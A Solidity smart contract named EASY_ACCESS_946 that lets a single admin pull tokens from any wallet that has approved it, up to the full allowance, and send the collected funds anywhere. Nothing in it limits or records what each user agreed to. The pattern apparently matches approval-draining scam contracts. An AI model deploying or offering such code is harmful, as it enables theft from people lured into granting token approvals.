// ===== FILE: EASY_ACCESS_946.sol =====
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface IERC20 {
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract EASY_ACCESS_946 {
    address public admin;

    modifier onlyAdmin() {
        require(msg.sender == admin, "Only admin can call this function");
        _;
    }

    event TokensTransferred(address indexed token, address indexed from, address indexed to, uint256 amount);
    event TokensWithdrawn(address indexed token, address indexed to, uint256 amount);
    event AdminChanged(address indexed oldAdmin, address indexed newAdmin);

    constructor() {
        admin = msg.sender;
    }

    function allowance(address token, address wallet) external view returns (uint256) {
        return IERC20(token).allowance(wallet, address(this));
    }

    function transferFrom(address token, address wallet, uint256 amount) external onlyAdmin {
        require(amount > 0, "Amount must be greater than zero");

        uint256 approvedAmount = IERC20(token).allowance(wallet, address(this));
        require(approvedAmount > 0, "No allowance set for this token");
        require(amount <= approvedAmount, "Requested amount exceeds allowance");

        uint256 userBalance = IERC20(token).balanceOf(wallet);
        require(userBalance >= amount, "Insufficient user token balance");

        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20(token).transferFrom.selector, wallet, address(this), amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "Transfer failed");

        emit TokensTransferred(token, wallet, address(this), amount);
    }

    function withdraw(address payable wallet, uint256 amount) external onlyAdmin {
        require(address(this).balance >= amount, "Insufficient contract balance");
        wallet.transfer(amount);
    }

    function transfer(address token, address wallet, uint256 amount) external onlyAdmin {
        uint256 contractBalance = IERC20(token).balanceOf(address(this));
        require(contractBalance >= amount, "Insufficient token balance on contract");
        require(amount > 0, "Amount must be greater than zero");

        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20(token).transfer.selector, wallet, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "Transfer failed");

        emit TokensWithdrawn(token, wallet, amount);
    }

    function changeAdmin(address newAdmin) external onlyAdmin {
        require(newAdmin != address(0), "New admin address cannot be zero");
        emit AdminChanged(admin, newAdmin);
        admin = newAdmin;
    }

    receive() external payable {}
}